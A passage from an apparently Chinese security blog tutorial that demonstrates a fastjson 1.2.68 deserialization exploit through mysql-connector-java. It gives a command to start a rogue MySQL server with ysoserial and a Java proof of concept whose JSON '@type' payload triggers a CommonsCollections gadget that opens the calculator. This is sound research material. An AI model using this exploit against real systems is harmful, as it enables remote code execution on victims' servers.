</span></span></code></pre></div><p>可以看到在处理“大字符串”时会进行反序列化，当 JDBC 首次连接MySQL服务器时，会主动使用sql查询（不同版本的JDBC查询的内容略有不同），恶意Mysql服务器即可返回我们构造好的恶意数据，最后就可以触发任意命令执行。</p><p>恶意MySQL服务可以使用 python3实现的 <a href=https://github.com/fnmsd/MySQL_Fake_Server>https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>也可以使用我参考 <code>MySQL_Fake_Server</code> 后用 Go 实现的 <a href=https://github.com/dushixiang/evil-mysql-server>https://github.com/dushixiang/evil-mysql-server</a></p><p>以 mysql-connector-java 5.1.11 为例，先启动恶意Mysql 服务端。</p><blockquote><p>这里没有使用自己构造恶意数据，而是使用了一个开源的 Java 反序列化工具 ysoserial</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./evil-mysql-server -addr <span style=color:#bd93f9>3306</span> -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
</span></span></code></pre></div><h3 id=测试代码>测试代码</h3><blockquote><p>需要pom依赖中存在 <code>commons-collections 3.1</code></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>import</span> com.alibaba.fastjson.JSON;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>Evil6</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span>(String<span style=color:#ff79c6>[]</span> args) {
</span></span><span style=display:flex><span>        <span style=color:#6272a4>// 5.1.11-5.1.48(反序列化链)</span>
</span></span><span style=display:flex><span>        String json <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;{\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;@type\&#34;: \&#34;java.lang.AutoCloseable\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;@type\&#34;: \&#34;com.mysql.jdbc.JDBC4Connection\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;hostToConnectTo\&#34;: \&#34;127.0.0.1\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;portToConnectTo\&#34;: 3306,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;info\&#34;: {\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;    \&#34;user\&#34;: \&#34;yso_CommonsCollections5_calc\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;    \&#34;password\&#34;: \&#34;pass\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;    \&#34;statementInterceptors\&#34;: \&#34;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;    \&#34;autoDeserialize\&#34;: \&#34;true\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;    \&#34;NUM_HOSTS\&#34;: \&#34;1\&#34;\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  },\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;databaseToConnectTo\&#34;: \&#34;dbname\&#34;,\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;  \&#34;url\&#34;: \&#34;\&#34;\n&#34;</span> <span style=color:#ff79c6>+</span>
</span></span><span style=display:flex><span>                <span style=color:#f1fa8c>&#34;}&#34;</span>;
</span></span><span style=display:flex><span>        JSON.<span style=color:#50fa7b>parseObject</span>(json);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>运行之后便可以看到本机打开了计算器，其他版本的 mysql-connector-java 也类似，可以自行挖掘更多利用链。</p><h2 id=注>注</h2><p>文中测试使用系统和工具版本如下：</p><ul><li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> java 1.8.0_301</li><li><strong>fastjson</strong> 1.2.68</li><li><strong>commons-collections</strong> 3.1</li><li><strong>ysoserial</strong> 0.0.6-SNAPSHOT</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=参考>参考</h2><ul><li><a href=https://www.buaq.net/go-82366.html>https://www.buaq.net/go-82366.html</a></li></ul></article></div></main></body></html>